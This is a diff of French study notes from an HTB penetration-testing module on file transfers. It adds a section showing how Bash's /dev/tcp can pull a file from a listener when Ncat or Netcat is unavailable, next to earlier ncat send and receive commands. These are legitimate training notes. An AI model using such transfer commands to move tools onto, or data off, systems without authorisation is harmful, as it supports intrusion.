@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-26T16:00:44.436Z
+date: 2025-04-26T16:05:41.803Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -700,5 +700,17 @@ sudo ncat -l -p <port> --send-only < <fichier>
 Avec **Ncat**, se connecter et envoi la réponse dans un fichier:
 ```
 ncat <adresse> <port> --recv-only > <fichier>
+```
+
+---
+
+Si Ncat ou Netcat n'est pas disponible, Bash supporte les opérations en lecture/écriture vers [/dev/tcp](https://tldp.org/LDP/abs/html/devref1.html).
+
+Écrire vers ce fichier permet au shell d'ouvrir une connection TCP vers `hôte:port`.
+
+Après avoir créer un listener qui envoi le contenu du fichier lors des connexions:
+
+```
+cat < /dev/tcp/<adresse>/<port> > <fichier>
 ```
 
